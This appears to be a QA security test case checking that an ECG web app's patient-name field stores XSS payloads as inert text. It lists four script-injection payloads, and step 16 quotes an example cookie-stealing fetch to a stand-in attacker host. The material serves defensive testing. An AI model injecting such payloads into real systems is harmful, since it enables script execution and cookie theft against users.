---
id: TC_SEC_005
module: Security
title: XSS in Patient Name — Script Stored but Not Executed
type: Security
severity: Critical
preconditions: [PC_001, PC_002, PC_003, PC_007]
---

## Scenario
A tester submits a Cross-Site Scripting (XSS) payload as the patient name in the patient data entry form. The payload must be stored (if the field accepts free text), but when rendered back in the UI, it must be treated as plain text — not executed as a script. No JavaScript alert, DOM manipulation, or network request should be triggered by the stored payload.

## Preconditions
- [PC_001](../preconditions/PC_001_browser_ready.md) - Browser is open, JavaScript is enabled, and network is available
- [PC_002](../preconditions/PC_002_authenticated_user.md) - User is logged in and on the ECG dashboard
- [PC_003](../preconditions/PC_003_ecg_available.md) - At least one ECG record is available and awaiting patient data entry
- [PC_007](../preconditions/PC_007_mock_ecg_seeded.md) - A mock ECG has been seeded if no unprocessed ECG is available

## Test Data
| Field              | Value                                        |
|--------------------|----------------------------------------------|
| XSS Payload 1      | `<script>alert('XSS')</script>`              |
| XSS Payload 2      | `<img src=x onerror=alert('XSS')>`           |
| XSS Payload 3      | `"><svg onload=alert(1)>`                    |
| XSS Payload 4      | `javascript:alert(1)`                        |
| Other fields       | Fill with valid data to pass form validation |

## Steps

### Phase 1 — Open Patient Form
1. From the ECG dashboard, click on a new/unprocessed ECG record
2. Click `flt-semantics-placeholder` to re-activate the Flutter accessibility tree
3. Navigate to the patient data entry form

### Phase 2 — Submit XSS Payload
4. In the **Patient Name** field, enter Payload 1: `<script>alert('XSS')</script>`
5. Fill all other required fields with valid data
6. Click **Submit** / **Save**
7. Watch for a JavaScript `alert()` dialog — if one appears, stop and log as Critical
8. Observe the Network tab for the POST request — confirm the payload was sent to the backend

### Phase 3 — Verify Rendered Output
9. After submission, navigate to the ECG detail view or the ECG list where the patient name is displayed
10. Click `flt-semantics-placeholder` to re-activate accessibility
11. Verify that the patient name field renders the payload as **literal text** (e.g., shows `<script>alert('XSS')</script>`) — not as an executed script
12. Confirm no alert dialog appeared during rendering
13. Repeat steps 4–12 for Payloads 2, 3, and 4 (use fresh ECG records or edit the same patient if the form supports edits)

### Phase 4 — Check Console
14. Open DevTools → Console tab
15. Confirm no errors or warnings related to script injection are logged
16. Confirm no unexpected network requests were triggered by the XSS payload (check for out-of-band requests like `fetch('https://attacker.com?cookie=...')`)

## Expected Result
- **No JavaScript alert dialogs appear** at any point during or after submission
- The XSS payload is rendered as **escaped plain text** in the UI (e.g., `&lt;script&gt;` or the literal string `<script>...`)
- The Flutter CanvasKit rendering engine inherently does not execute raw HTML/JS injected as text, but the backend storage and any server-side rendered content must also be sanitized
- No unexpected network requests originating from the payload are visible in the Network tab
- If client-side form validation rejects the payload entirely, document which payloads were blocked and which were accepted — both outcomes are acceptable if the rejection is consistent and graceful

## Actual Result
_To be filled during execution_

## Status
_To be filled during execution_

## Notes
- **Flutter Web context:** Flutter CanvasKit renders UI on a `<canvas>` element — raw HTML injected into Flutter text widgets does not execute as HTML in the DOM. This provides a degree of inherent XSS protection in the Flutter rendering layer. However:
  - The backend must still sanitize/escape stored values to protect any non-Flutter consumers of the API (admin panels, reports, other clients).
  - Any webview, iframe, or HTML-based rendering within the Flutter app remains vulnerable.
  - PDF generation that embeds stored strings may be vulnerable to injection attacks in the PDF rendering engine.
- Test with each payload independently to identify which specific formats (if any) cause issues.
- The stored payload in the database is a **security risk** even if the Flutter client renders it safely — log any unsanitized storage as **High** (backend sanitization missing).
